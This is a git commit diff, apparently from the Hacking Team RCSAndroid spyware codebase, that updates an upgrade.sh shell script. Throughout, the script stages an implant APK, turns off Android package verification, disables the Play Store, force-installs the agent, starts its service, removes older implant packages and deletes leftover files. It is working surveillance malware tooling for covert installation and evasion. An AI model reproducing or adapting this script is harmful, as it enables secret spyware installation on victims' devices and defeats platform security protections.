4c9ba305813618cff148f003775ae6a2c91535ba
Zeno <zeno@hackingteam.com>
2014-09-29 10:13:35 +0200

    9.4.1 version upgrade dvci and deviceinfo

--- RCSAndroid/server/template/upgrade.sh
+++ RCSAndroid/server/template/upgrade.sh
@@ -1,14 +1,13 @@
-
 export LD_LIBRARY_PATH=/vendor/lib:/system/lib
 
-rm /sdcard/core.apk
-cat /data/data/*/app_qza/core.*.apk > /sdcard/core.apk
+rm /data/local/tmp/providers.apk
+cat /data/data/*/app_qza/core.*.apk > /data/local/tmp/providers.apk
 
 settings put global package_verifier_enable 0
 pm disable com.android.vending
 sleep 1
 
-pm install -f /sdcard/core.apk
+pm install -r -f /data/local/tmp/providers.apk
 sleep 2
 
 am startservice com.android.dvci/.ServiceMain
@@ -20,19 +19,19 @@ for geb in `ls /data/data/*/files/geb`; do
 	init=${geb#/data/data/}
     package=${init%%/*}
 
-    pm disable $package
-    pm uninstall $package
+    if [ "$package" != "com.android.dvci" ]; then
+	    pm disable $package
+	    pm uninstall $package
+	fi
 done
 
 sleep 2
 settings put global package_verifier_enable 1
 pm enable com.android.vending
 
-rm /sdcard/core.apk
+rm /data/local/tmp/providers.apk
 rm -r /sdcard/.lost.found
-#rm -r /data/data/com.android.deviceinfo
-#rm /data/app/com.android.deviceinfo*
-#rm -r /data/app-lib/com.android.deviceinfo*
+
 
 
 
